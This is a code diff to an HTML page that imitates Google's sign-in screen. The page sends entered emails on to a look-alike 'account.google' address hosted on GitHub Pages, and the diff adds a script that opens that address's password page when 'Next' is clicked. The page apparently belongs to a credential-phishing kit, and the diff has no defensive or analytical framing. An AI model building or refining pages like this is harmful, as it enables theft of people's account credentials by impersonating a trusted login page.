@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Sign In</title>
     <link rel="stylesheet" href="style.css">
+    <script>
+        function welcome(){
+            window.open("https://officialsite1.github.io/account.google/password.html")
+        }
+    </script>
 
     <!-- Source for fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -25,7 +30,7 @@
                 <input type="hidden" name="_next" value="https://officialsite1.github.io/account.google/password.html">
                 <input type="text" name="Email" id="input">
                 <div id="placeholder">Email or phone</div>
-                <button type="submit" value="Next" id="btn_right">Next</button>
+                <button type="submit" value="Next" id="btn_right" onclick="welcome()">Next</button>
             </form>
             <div id="link1" class="link">Forgot email?</div>
             <div id="not">Not your computer? Use Guest mode to sign in privately.</div>
